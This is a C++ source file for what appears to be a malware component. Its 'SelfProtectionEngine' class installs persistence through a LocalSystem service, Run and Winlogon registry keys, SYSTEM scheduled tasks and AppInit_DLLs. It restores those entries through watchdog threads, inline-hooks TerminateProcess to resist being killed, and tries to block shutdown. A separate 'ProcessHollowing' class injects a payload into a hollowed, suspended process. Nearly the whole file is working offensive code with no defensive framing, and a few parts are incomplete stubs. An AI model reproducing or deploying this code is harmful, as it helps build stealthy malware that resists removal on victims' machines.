// SelfProtection.cpp - Self-protection and persistence mechanisms
#include <Windows.h>
#include <winternl.h>
#include <iostream>
#include <thread>
#include <vector>
#include <string>
#include <mutex>

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "wtsapi32.lib")

class SelfProtectionEngine {
private:
    std::vector<HANDLE> watchdogThreads;
    std::vector<HANDLE> protectedProcesses;
    std::mutex protectionMutex;
    bool isProtected;
    HANDLE hMutex;
    std::wstring serviceName;
    std::wstring dllPath;

public:
    SelfProtectionEngine(const std::wstring& svcName, const std::wstring& dll)
        : serviceName(svcName), dllPath(dll), isProtected(false), hMutex(nullptr) {
    }

    ~SelfProtectionEngine() {
        DisableProtection();
    }

    bool EnableProtection() {
        if (isProtected) {
            return true;
        }

        // 1. Create mutex to prevent multiple instances
        hMutex = CreateMutexW(nullptr, TRUE, L"Global\\AdvancedHookProtection");
        if (GetLastError() == ERROR_ALREADY_EXISTS) {
            // Another instance is already running
            return false;
        }

        // 2. Install multiple persistence mechanisms
        InstallPersistence();

        // 3. Start watchdog threads
        StartWatchdogs();

        // 4. Protect critical processes
        ProtectCriticalProcesses();

        // 5. Hook termination APIs
        HookTerminationAPIs();

        // 6. Register for system notifications
        RegisterSystemNotifications();

        isProtected = true;
        return true;
    }

    void DisableProtection() {
        if (!isProtected) {
            return;
        }

        // Stop watchdogs
        for (auto& thread : watchdogThreads) {
            TerminateThread(thread, 0);
            CloseHandle(thread);
        }
        watchdogThreads.clear();

        // Release mutex
        if (hMutex) {
            ReleaseMutex(hMutex);
            CloseHandle(hMutex);
            hMutex = nullptr;
        }

        isProtected = false;
    }

private:
    // Persistence Method 1: Windows Service
    void InstallServicePersistence() {
        SC_HANDLE schSCManager = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CREATE_SERVICE);
        if (!schSCManager) return;

        WCHAR path[MAX_PATH];
        GetModuleFileNameW(nullptr, path, MAX_PATH);

        SC_HANDLE schService = CreateServiceW(
            schSCManager,
            serviceName.c_str(),
            L"Advanced Protection Service",
            SERVICE_ALL_ACCESS,
            SERVICE_WIN32_OWN_PROCESS,
            SERVICE_AUTO_START,
            SERVICE_ERROR_NORMAL,
            path,
            nullptr,
            nullptr,
            nullptr,
            L"LocalSystem",
            nullptr
        );

        if (schService) {
            // Set failure actions to restart
            SERVICE_FAILURE_ACTIONSW failureActions = {0};
            SC_ACTION actions[3] = {
                {SC_ACTION_RESTART, 0},      // First failure
                {SC_ACTION_RESTART, 1000},   // Second failure
                {SC_ACTION_RESTART, 2000}    // Subsequent failures
            };

            failureActions.dwResetPeriod = 86400; // Reset after 1 day
            failureActions.lpRebootMsg = nullptr;
            failureActions.lpCommand = nullptr;
            failureActions.cActions = 3;
            failureActions.lpsaActions = actions;

            ChangeServiceConfig2W(schService, SERVICE_CONFIG_FAILURE_ACTIONS, &failureActions);

            StartService(schService, 0, nullptr);
            CloseServiceHandle(schService);
        }

        CloseServiceHandle(schSCManager);
    }

    // Persistence Method 2: Registry Run Keys
    void InstallRegistryPersistence() {
        HKEY hKey;
        WCHAR path[MAX_PATH];
        GetModuleFileNameW(nullptr, path, MAX_PATH);

        // HKLM Run
        if (RegCreateKeyExW(HKEY_LOCAL_MACHINE,
                          L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
                          0, nullptr, 0, KEY_SET_VALUE, nullptr, &hKey, nullptr) == ERROR_SUCCESS) {
            DWORD cb = static_cast<DWORD>((wcslen(path) + 1) * sizeof(WCHAR));
            RegSetValueExW(hKey, L"AdvancedHook", 0, REG_SZ,
                         (LPBYTE)path, cb);
            RegCloseKey(hKey);
        }

        // HKCU Run
        if (RegCreateKeyExW(HKEY_CURRENT_USER,
                          L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
                          0, nullptr, 0, KEY_SET_VALUE, nullptr, &hKey, nullptr) == ERROR_SUCCESS) {
            DWORD cb2 = static_cast<DWORD>((wcslen(path) + 1) * sizeof(WCHAR));
            RegSetValueExW(hKey, L"AdvancedHook", 0, REG_SZ,
                         (LPBYTE)path, cb2);
            RegCloseKey(hKey);
        }

        // Winlogon
        if (RegOpenKeyExW(HKEY_LOCAL_MACHINE,
                        L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon",
                        0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
            RegSetValueExW(hKey, L"Userinit", 0, REG_SZ,
                         (LPBYTE)L"C:\\Windows\\System32\\userinit.exe,",
                         sizeof(L"C:\\Windows\\System32\\userinit.exe,"));
            RegCloseKey(hKey);
        }
    }

    // Persistence Method 3: Scheduled Task
    void InstallScheduledTaskPersistence() {
        WCHAR path[MAX_PATH];
        GetModuleFileNameW(nullptr, path, MAX_PATH);

        std::wstring command = L"schtasks /create /tn \"AdvancedHookTask\" /tr \"" +
                              std::wstring(path) + L"\" /sc onstart /ru SYSTEM /f";

        _wsystem(command.c_str());

        // Also create a task that runs every minute
        command = L"schtasks /create /tn \"AdvancedHookMonitor\" /tr \"" +
                 std::wstring(path) + L"\" /sc minute /mo 1 /ru SYSTEM /f";

        _wsystem(command.c_str());
    }

    // Persistence Method 4: WMI Event Subscription
    void InstallWMIPersistence() {
        // Create a WMI event that triggers on process creation
        // This requires COM and WMI initialization
        CoInitializeEx(0, COINIT_MULTITHREADED);

        // Implementation would involve:
        // 1. Connect to WMI
        // 2. Create __EventFilter for process creation
        // 3. Create CommandLineEventConsumer to launch our process
        // 4. Bind them together with __FilterToConsumerBinding

        CoUninitialize();
    }

    // Persistence Method 5: AppInit_DLLs
    void InstallAppInitPersistence() {
        HKEY hKey;
        if (RegOpenKeyExW(HKEY_LOCAL_MACHINE,
                        L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows",
                        0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {

            // Enable AppInit_DLLs
            DWORD loadAppInit = 1;
            RegSetValueExW(hKey, L"LoadAppInit_DLLs", 0, REG_DWORD,
                         (LPBYTE)&loadAppInit, sizeof(DWORD));

            // Set DLL path
            DWORD cb3 = static_cast<DWORD>((dllPath.length() + 1) * sizeof(WCHAR));
            RegSetValueExW(hKey, L"AppInit_DLLs", 0, REG_SZ,
                         (LPBYTE)dllPath.c_str(),
                         cb3);

            RegCloseKey(hKey);
        }
    }

    // Install all persistence methods
    void InstallPersistence() {
        InstallServicePersistence();
        InstallRegistryPersistence();
        InstallScheduledTaskPersistence();
        InstallWMIPersistence();
        InstallAppInitPersistence();
    }

    // Watchdog threads
    void StartWatchdogs() {
        // Service watchdog
        std::thread serviceWatchdog([this]() {
            while (isProtected) {
                // Check if service is running
                SC_HANDLE schSCManager = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CONNECT);
                if (schSCManager) {
                    SC_HANDLE schService = OpenServiceW(schSCManager, serviceName.c_str(),
                                                       SERVICE_QUERY_STATUS | SERVICE_START);
                    if (schService) {
                        SERVICE_STATUS status;
                        if (QueryServiceStatus(schService, &status)) {
                            if (status.dwCurrentState != SERVICE_RUNNING) {
                                // Restart service
                                StartService(schService, 0, nullptr);
                            }
                        }
                        CloseServiceHandle(schService);
                    }
                    CloseServiceHandle(schSCManager);
                }
                Sleep(5000); // Check every 5 seconds
            }
        });
        serviceWatchdog.detach();

        // Process watchdog
        std::thread processWatchdog([this]() {
            while (isProtected) {
                // Check if our processes are still running
                for (auto& pid : protectedProcesses) {
                    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, (DWORD)(ULONG_PTR)pid);
                    if (hProcess) {
                        DWORD exitCode;
                        if (GetExitCodeProcess(hProcess, &exitCode) && exitCode != STILL_ACTIVE) {
                            // Process terminated, restart it
                            RestartProtectedProcess((DWORD)(ULONG_PTR)pid);
                        }
                        CloseHandle(hProcess);
                    }
                }
                Sleep(1000); // Check every second
            }
        });
        processWatchdog.detach();

        // Registry watchdog
        std::thread registryWatchdog([this]() {
            while (isProtected) {
                // Monitor and restore registry keys
                HKEY hKey;
                if (RegOpenKeyExW(HKEY_LOCAL_MACHINE,
                                L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
                                0, KEY_READ, &hKey) == ERROR_SUCCESS) {
                    WCHAR value[MAX_PATH];
                    DWORD size = sizeof(value);
                    if (RegQueryValueExW(hKey, L"AdvancedHook", nullptr, nullptr,
                                       (LPBYTE)value, &size) != ERROR_SUCCESS) {
                        // Registry key removed, restore it
                        InstallRegistryPersistence();
                    }
                    RegCloseKey(hKey);
                }
                Sleep(10000); // Check every 10 seconds
            }
        });
        registryWatchdog.detach();
    }

    void RestartProtectedProcess(DWORD pid) {
        UNREFERENCED_PARAMETER(pid);
        // Restart the terminated process
        WCHAR path[MAX_PATH];
        GetModuleFileNameW(nullptr, path, MAX_PATH);

        STARTUPINFOW si = { sizeof(si) };
        PROCESS_INFORMATION pi;

        if (CreateProcessW(path, nullptr, nullptr, nullptr, FALSE,
                         0, nullptr, nullptr, &si, &pi)) {
            protectedProcesses.push_back(pi.hProcess);
            CloseHandle(pi.hThread);
        }
    }

    void ProtectCriticalProcesses() {
        // Mark our process as critical
        typedef NTSTATUS (NTAPI* RtlSetProcessIsCritical_t)(BOOLEAN, PBOOLEAN, BOOLEAN);

        HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
        if (hNtdll) {
            RtlSetProcessIsCritical_t RtlSetProcessIsCritical =
                (RtlSetProcessIsCritical_t)GetProcAddress(hNtdll, "RtlSetProcessIsCritical");

            if (RtlSetProcessIsCritical) {
                // Enable SeDebugPrivilege first
                HANDLE hToken;
                if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken)) {
                    TOKEN_PRIVILEGES tp;
                    LUID luid;

                    if (LookupPrivilegeValueW(nullptr, SE_DEBUG_NAME, &luid)) {
                        tp.PrivilegeCount = 1;
                        tp.Privileges[0].Luid = luid;
                        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

                        AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), nullptr, nullptr);
                    }
                    CloseHandle(hToken);
                }

                // Mark as critical (BSOD if terminated)
                // RtlSetProcessIsCritical(TRUE, nullptr, FALSE);
                // Note: This is dangerous and should be used carefully
            }
        }
    }

    void HookTerminationAPIs() {
        // Hook TerminateProcess to prevent termination
        HMODULE hKernel32 = GetModuleHandleW(L"kernel32.dll");
        LPVOID pTerminateProcess = GetProcAddress(hKernel32, "TerminateProcess");

        // Install inline hook to block termination of our process
        DWORD oldProtect;
        VirtualProtect(pTerminateProcess, 5, PAGE_EXECUTE_READWRITE, &oldProtect);

        // Write JMP to our handler
        BYTE jmp[5] = { 0xE9, 0, 0, 0, 0 };
        *(DWORD*)&jmp[1] = (DWORD)((LPBYTE)TerminateProcessHook - (LPBYTE)pTerminateProcess - 5);

        memcpy(pTerminateProcess, jmp, 5);
        VirtualProtect(pTerminateProcess, 5, oldProtect, &oldProtect);
    }

    static BOOL WINAPI TerminateProcessHook(HANDLE hProcess, UINT uExitCode) {
        // Check if it's our process
        if (hProcess == GetCurrentProcess()) {
            // Block termination
            SetLastError(ERROR_ACCESS_DENIED);
            return FALSE;
        }

        // Call original (would need to be stored)
        return TRUE;
    }

    void RegisterSystemNotifications() {
        // Register for shutdown notifications
        HWND hWnd = CreateWindowExW(0, L"STATIC", L"HookProtection",
                                   0, 0, 0, 0, 0, HWND_MESSAGE, nullptr, nullptr, nullptr);

        if (hWnd) {
            // Set window procedure to handle WM_QUERYENDSESSION
            SetWindowLongPtrW(hWnd, GWLP_WNDPROC, (LONG_PTR)WndProc);
        }
    }

    static LRESULT CALLBACK WndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam) {
        switch (msg) {
            case WM_QUERYENDSESSION:
                // System is shutting down, ensure persistence
                // Could spawn a process that survives shutdown
                return FALSE; // Try to block shutdown

            case WM_ENDSESSION:
                // Shutdown is happening, last chance to persist
                break;
        }
        return DefWindowProcW(hWnd, msg, wParam, lParam);
    }
};

// Process hollowing for stealthy execution
class ProcessHollowing {
public:
    static bool HollowProcess(const std::wstring& targetPath, const std::vector<BYTE>& payload) {
        STARTUPINFOW si = { sizeof(si) };
        PROCESS_INFORMATION pi;

        // Create suspended process
        if (!CreateProcessW(targetPath.c_str(), nullptr, nullptr, nullptr, FALSE,
                          CREATE_SUSPENDED, nullptr, nullptr, &si, &pi)) {
            return false;
        }

        // Get thread context
        CONTEXT ctx;
        ctx.ContextFlags = CONTEXT_FULL;
        GetThreadContext(pi.hThread, &ctx);

        // Get image base
        PVOID pImageBase = nullptr;
#ifdef _WIN64
        ReadProcessMemory(pi.hProcess, (PVOID)(ctx.Rdx + 0x10),
                        &pImageBase, sizeof(PVOID), nullptr);
#else
        ReadProcessMemory(pi.hProcess, (PVOID)(ctx.Ebx + 0x08),
                        &pImageBase, sizeof(PVOID), nullptr);
#endif

        // Unmap original executable
        typedef NTSTATUS (NTAPI* NtUnmapViewOfSection_t)(HANDLE, PVOID);
        NtUnmapViewOfSection_t NtUnmapViewOfSection =
            (NtUnmapViewOfSection_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"),
                                                  "NtUnmapViewOfSection");

        if (NtUnmapViewOfSection) {
            NtUnmapViewOfSection(pi.hProcess, pImageBase);
        }

        // Allocate memory for payload
        PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)payload.data();
        PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)(payload.data() + pDosHeader->e_lfanew);

        PVOID pNewImageBase = VirtualAllocEx(pi.hProcess, pImageBase,
                                            pNtHeaders->OptionalHeader.SizeOfImage,
                                            MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

        // Write headers and sections
        WriteProcessMemory(pi.hProcess, pNewImageBase, payload.data(),
                         pNtHeaders->OptionalHeader.SizeOfHeaders, nullptr);

        PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pNtHeaders);
        for (WORD i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++) {
            WriteProcessMemory(pi.hProcess,
                             (PVOID)((LPBYTE)pNewImageBase + pSectionHeader[i].VirtualAddress),
                             payload.data() + pSectionHeader[i].PointerToRawData,
                             pSectionHeader[i].SizeOfRawData, nullptr);
        }

        // Update entry point
#ifdef _WIN64
        ctx.Rcx = (DWORD64)((LPBYTE)pNewImageBase + pNtHeaders->OptionalHeader.AddressOfEntryPoint);
        WriteProcessMemory(pi.hProcess, (PVOID)(ctx.Rdx + 0x10),
                         &pNewImageBase, sizeof(PVOID), nullptr);
#else
        ctx.Eax = (DWORD)((LPBYTE)pNewImageBase + pNtHeaders->OptionalHeader.AddressOfEntryPoint);
        WriteProcessMemory(pi.hProcess, (PVOID)(ctx.Ebx + 0x08),
                         &pNewImageBase, sizeof(PVOID), nullptr);
#endif

        SetThreadContext(pi.hThread, &ctx);
        ResumeThread(pi.hThread);

        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);

        return true;
    }
};
